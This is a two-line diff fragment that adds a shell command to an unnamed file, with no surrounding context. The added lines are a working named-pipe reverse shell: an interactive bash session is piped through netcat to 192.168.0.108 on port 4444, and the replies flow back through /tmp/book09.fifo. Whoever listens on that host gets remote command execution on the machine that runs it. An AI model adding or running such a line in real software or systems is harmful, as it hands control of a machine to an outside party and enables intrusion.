@@ -1,0 +1,2 @@
+cat /tmp/book09.fifo | bash -i 2>&1 | \
+nc -N 192.168.0.108 4444 > /tmp/book09.fifo
